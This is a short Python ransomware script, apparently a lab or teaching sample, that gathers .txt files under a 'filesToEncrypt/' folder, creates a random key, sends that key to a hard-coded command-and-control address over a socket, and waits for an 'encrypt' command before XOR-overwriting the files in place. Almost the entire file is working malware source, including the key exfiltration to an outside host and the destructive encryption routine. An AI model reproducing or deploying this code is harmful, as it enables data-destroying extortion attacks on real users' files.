import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

# files to encrypt 
encrypted_ext = (".txt")


file_paths = []
for root, dirs, files in os.walk("filesToEncrypt/"):
    for file in files :
        file_path,file_ext = os.path.splitext(root+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+file)

# generate key
key = ''
encryption_level = 128 // 8
char_pool = ''

for i in range(0x00,0xff):
    char_pool += (chr(i))

for i in range(encryption_level):
    key+= random.choice(char_pool)


# get hostname
hostname = socket.gethostname()


# key exchange with C2
ip_address = "192.168.5.129"
port = 5678
time = datetime.now()



with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f'[{time}] - {ip_address}:{port} - {key}'.encode('utf-8'))

def encrypt(key):
    while not q.empty():
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        with open(file, 'rb') as f:
            data = f.read()
        with open(file, 'wb') as f:
            for byte in data:
                xor_byte = byte ^ ord(key[index])
                f.write(xor_byte.to_bytes(1, 'little'))
                if index >= max_index:
                    index = 0
                else:
                    index += 1


q = Queue()
for file in file_paths:
    q.put(file)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 5679))
s.listen(5)
while True:
    print("Waiting for reply")
    clientsocket, address = s.accept()
    conn_attempt = clientsocket.recv(1024)
    conn_attempt_msg =  conn_attempt.decode("utf-8")
    print(f"Connection attempt: {conn_attempt_msg}")
    command = clientsocket.recv(1024)
    command_msg =  command.decode("utf-8")
    print(f"Command received: {command_msg}")
    if (command_msg == "encrypt"):
        encrypt(key)
        print("Encryption complete")
        break
s.close()

